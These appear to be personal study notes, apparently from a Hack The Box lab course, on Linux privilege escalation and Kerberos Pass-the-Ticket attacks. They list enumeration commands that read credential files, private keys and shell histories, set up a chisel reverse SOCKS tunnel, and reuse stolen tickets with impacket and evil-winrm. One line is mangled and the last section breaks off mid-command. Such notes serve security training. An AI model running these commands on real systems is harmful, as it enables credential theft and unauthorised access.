---
title: Linux Privilege Escalation Overview
aliases: []
tags:
- topic/linux-privesc
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: linux-privesc.md
related_tools:
- '[[linenum]]'
- '[[impacket-wmiexec]]'
- '[[evil-winrm]]'
- '[[keytabextract]]'
- '[[kinit]]'
- '[[klist]]'
- '[[Rubeus]]'
- '[[linikatz]]'
related_techniques:
- '[[t1003-003]]'
- '[[t1132-001]]'
related_tactics:
- '[[t1003]]'
- '[[t1132]]'
related_services:
- '[[Kerberos]]'
related_os:
- '[[/etc/os-release]]'
- '[[etc-passwd]]'
- '[[/etc/group]]'
- '[[/etc/shells]]'
- '[[/etc/cron.daily/]]'
- '[[/etc/fstab]]'
- '[[/home/*]]'
- '[[/proc/version]]'
- '[[/etc/resolv.conf]]'
- '[[/etc/crontab]]'
- '[[/var/log/*]]'
- '[[/home/kali]]'
- '[[/home/*/.bash_history]]'
- '[[/home/*/.ssh/id_rsa]]'
- '[[/home/*/.bash*]]'
- '[[/home/*/.mozilla/firefox/]]'
- '[[/etc/krb5.conf]]'
- '[[/etc/krb5.keytab]]'
- '[[opt-specialfiles-carlos-keytab]]'
- '[[/opt/keytabextract.py]]'
- '[[/opt/linikatz.sh]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: linux
---

# Linux Privilege Escalation Overview

## Overview
This section covers various methods and tools for Linux privilege escalation, including commands and techniques to identify the operating system, kernel, network configuration, services, and other sensitive information.

## Identifying the Operating System
- `hostnamectl`
- `cat /etc/os-release`
- `lsb_release -a`

## Identifying the Kernel
- `uname -r`
- `cat /proc/version`
- `hostnamectl | grep Kernel`

## Identifying the Network Configuration
- `ifconfig`
- `ip -a`
- `route`
- `netstat -rn`
- `cat /etc/resolv.conf`
- `arp -a`

## Identifying Services
- `ps aux`
- `ps aux | grep root`

## Identifying Shells
- `cat /etc/shells`

## Identifying Installed Packages
- `apt list --installed`

## Identifying Logged-in Users
- `who`
- `w`
- `users`

## Identifying Groups
- `cat /etc/group`
- `getent group sudo`

## Identifying Home Directories
- `ls /home`
- `cat .bash_history`

## Identifying Sudo Privileges
- `sudo -l`
- `sudo su`

## Content Keyword Search
- `grep --color=auto -rnw '/home/kali' -ie 'Password' --color=always 2>/dev/null`

## Identifying Password Hashes
- `cat /etc/passwd`
- `grep sh$ /etc/passwd`

## Identifying Cron Jobs
- `ls -la /etc/cron.daily/`

## Identifying File Systems and Additional Drives
- `lsblk`
- `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
- `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
- `lpstat`
- `cat /etc/fstab`
- `df -h`
- `cat /etc/fstab | grep -v '#' | column -t`
- `find / -type d -name '.*' -ls 2>/dev/null`
- `find / -type f -name '.*' -exec ls -l {} \; 2>/dev/null | grep htb-student`
- `ls -l /tmp /var/tmp /dev/shm`
- `cd / && find / -name *.sh 2>/dev/null | xargs cat | grep 'HTB'`
- `for l in ".conf .config .cnf"; do echo -e \nFile extension: \$l; find / -name *\$l 2>/dev/null | grep -v 'lib\|fonts\|share\|core' ;done`
- `for i in $(find / -name *.cnf 2>/dev/null | grep -v 'doc\|lib'); do echo -e \nFile: \$i; grep 'user\|password\|pass' \$i 2>/dev/null | grep -v '\#' ;done`
- `for l in ".sql .db .*db .db*"; do echo -e \nDB File extension: \$l; find / -name *\$l 2>/dev/null | grep -v 'doc\|lib\|headers\|share\|man' ;done`
- `find /home/* -type f -name '*.txt' -o ! -name '*.*'`
- `for l in ".py .pyc .pl .go .jar .c .sh"; do echo -e \nFile extension: \$l; find / -name *\$l 2>/dev/null | grep -v 'doc\|lib\|headers\|share' ;done`
- `cat /etc/crontab`
- `grep -rnw 'PRIVATE KEY' /home/* 2>/dev/null | grep ':1'`
- `grep -rnw 'ssh-rsa' /home/* 2>/dev/null | grep ':1'`
- `tail -n5 /home/*/.bash*`
- `for i in $(ls /var/log/* 2>/dev/null); do GREP=$(grep 'accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs' \$i 2>/dev/null); if [[ \$GREP ]]; then echo -e \n#### Log file: \$i; grep 'accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs' \$i 2>/dev/null; fi; done`
- `ls -l .mozilla/firefox/ | grep default`

## Pass the Ticket (PtT) from Linux
- Linux connected to Active Directory commonly uses Kerberos as authentication
- to attack we need
  - KRB5CCNAME environment variable is set to the ccache file we want to use `export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133`
  - to be able to connect to the domain controller
    - [kali] -> [foothold] -> [domaincontroller]
    - add foothold machine to /etc/hosts `172.16.1.5  ms01.inlanefreight.htb  ms01`
    - modify proxychains configuration file to use socks5 and port 1080 `cat /etc/proxychains.conf`
      - `[ProxyList]`
      - `socks5 127.0.0.1 1080`
    - setup chisel on kali
      - `wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz`
      - `gzip -d chisel_1.7.7_linux_amd64.gz`
      - `mv chisel_* chisel && chmod +x ./chisel`
      - `sudo ./chisel server --reverse`
      - `2022/10/10 07:26:15 server: Reverse tunneling enabled`
    - execute chisel on foothold
      - `c:	ools\\{chisel.exe client 10.10.14.33:8080 R:socks`
    - execute proxychains on kali
      - impacket
        - `proxychains impacket-wmiexec dc01 -k`
          - must specify hostname of dc
          - must use option `-k`
          - disable password prompt `-no-pass`
      - evil-winrm
        - get kerberos authentication package
          - `sudo apt-get install krb5-user -y`
            - set domain name=`INLANEFREIGHT.HTB` and KDC=`DC01`
          - if the package is already installed we need to udpate the configuration
            - `cat /etc/krb5.conf`
            - 
              ```sh
              [libdefaults]
                      default_realm = INLANEFREIGHT.HTB
              <SNIP>
              [realms]
                  INLANEFREIGHT.HTB = {
                      kdc = dc01.inlanefreight.htb
                  }
              <SNIP>
              ```
          - now execute
          - `proxychains evil-winrm -i dc01 -r inlanefreight.htb`
          - 
    - lets find tickets
      - commonly stored in [credential cache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)
      - Kerberos tickets as ccache files in the /tmp directory
      - the environment variable KRB5CCNAME can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed
      -  ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets
    - keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files. Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file
    - Keytab files can be used to impersonate users
      - *note* To use a keytab file, we must have read and write (rw) privileges on the file.
      - *note* a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account `LINUX01$.INLANEFREIGHT.HTB`
      - `find / -name *keytab* -ls 2>/dev/null`
      - find in cron jobs
        - find keytab references
          - `crontab -l`
          - look for references to executable scripts
            - eg `*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh`
    - ssh
      - `ssh david@inlanefreight.htb@10.129.204.23 -p 2222`
    - check if domain joined 
      - `ps -ef | grep -i

## References
- https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist
- https://github.com/sosdave/KeyTabExtract
- https://github.com/CiscoCXSecurity/linikatz

